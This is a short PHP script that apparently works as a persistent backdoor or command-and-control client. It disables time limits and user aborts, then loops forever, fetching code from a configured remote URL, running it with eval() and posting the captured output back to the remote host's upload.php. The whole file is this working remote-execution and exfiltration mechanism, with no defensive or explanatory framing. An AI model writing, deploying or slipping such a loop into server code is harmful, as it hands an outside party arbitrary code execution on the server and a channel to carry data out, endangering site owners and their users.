<?php
include("config.php");
set_time_limit(0);
ignore_user_abort();
$token_run=md5(uniqid(rand(),true));
file_put_contents("token.txt",$token_run);
$token_file=$token_run;
while($token_run==$token_file){
	$text=@file_get_contents($config["url"]."code.php?pwd=".$config["password"]);
	if($text!=""){
		echo "Run ".date("H:i:s")."\r\n";
		echo $text."\r\n";
		ob_start();
		eval($text);
		$result=ob_get_contents();
		ob_end_clean();
		$post=array("pwd"=>$config["password"],"result"=>$result);
		$ch=curl_init();
		curl_setopt($ch,CURLOPT_URL,$config["url"]."upload.php");
		curl_setopt($ch,CURLOPT_POST,1);
		curl_setopt($ch,CURLOPT_POSTFIELDS,$post);
		$result=curl_exec($ch);
		curl_close($ch);
	}
	sleep($config["sleeptime"]);
	$token_file=@file_get_contents("token.txt");
}
?>